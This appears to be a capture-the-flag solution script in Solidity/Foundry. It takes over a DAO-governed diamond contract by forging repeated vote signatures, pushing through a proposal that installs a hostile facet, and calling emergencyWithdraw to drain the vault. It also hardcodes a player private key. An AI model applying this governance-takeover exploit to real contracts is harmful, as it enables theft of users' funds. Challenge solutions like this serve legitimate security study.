// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

import "../src/Setup.sol";
import {IERC20} from "../src/interfaces/IERC20.sol";
import {IDAOFacet} from "../src/interfaces/IDAOFacet.sol";
import {IPigeonVaultFacet} from "../src/interfaces/IPigeonVaultFacet.sol";

import {PigeonDiamond} from "../src/PigeonDiamond.sol";

import {ContractHackFacet} from "../src/ContractHack.sol";

contract AttackerScript is Script {
    Setup setupContract;
    PigeonDiamond pigeonDiamond;

    address player;
    uint256 privateKey = 0x6aa8784b96b8009a325d61adcfe36933cc9b1b64e7247f6621d5cc7dfcd2198f;

    function setUp() public {
        setupContract = Setup(0x2CB0dC13D2f78371172E3D3D9Efd849366E2F1eA);
        pigeonDiamond = setupContract.pigeonDiamond();

        player = vm.addr(privateKey);
    }

    function run() public {
        vm.startBroadcast(privateKey);

        setupContract.claim();
        assert(IERC20(address(pigeonDiamond)).balanceOf(player) == 10_000 ether);

        IERC20(address(pigeonDiamond)).delegate(player);

        // Deploy HackContract
        ContractHackFacet hackFacet = new ContractHackFacet();

        bytes4[] memory selectors = new bytes4[](1);

        selectors[0] = hackFacet.initialize.selector;

        IDiamondCut.FacetCut memory hackFacetCut = IDiamondCut.FacetCut({
            facetAddress: address(hackFacet),
            action: IDiamondCut.FacetCutAction.Add,
            functionSelectors: selectors
        });

        // // can submit a proposal
        uint256 proposalId = IDAOFacet(address(pigeonDiamond)).submitProposal(
            address(hackFacet), abi.encodeWithSignature("initialize(address)", player), hackFacetCut
        );

        bytes[] memory signatures = createSignatures();

        // Loop and submit the signatures
        for (uint256 i = 0; i < signatures.length; i++) {
            IDAOFacet(address(pigeonDiamond)).castVoteBySig(3, true, signatures[i]);
        }

        IDAOFacet(address(pigeonDiamond)).executeProposal(3);

        IPigeonVaultFacet(address(pigeonDiamond)).emergencyWithdraw();

        assert(setupContract.isSolved());
    }

    function createSignatures() public view returns (bytes[] memory signatures) {
        bytes32 hash;
        uint8 v;
        bytes32 r;
        bytes32 s;
        bytes memory sig;

        signatures = new bytes[](11);

        for (uint256 i = 0; i < 11; i++) {
            // Create a unique hash for each iteration
            hash = keccak256(abi.encodePacked(i, true, player));

            // Sign the hash with the private key
            (v, r, s) = vm.sign(privateKey, hash);

            // Create the signature
            sig = abi.encodePacked(r, s, v);

            // Add the signature to the array
            signatures[i] = sig;

            // Do something with the signature...
        }

        return signatures;
    }
}
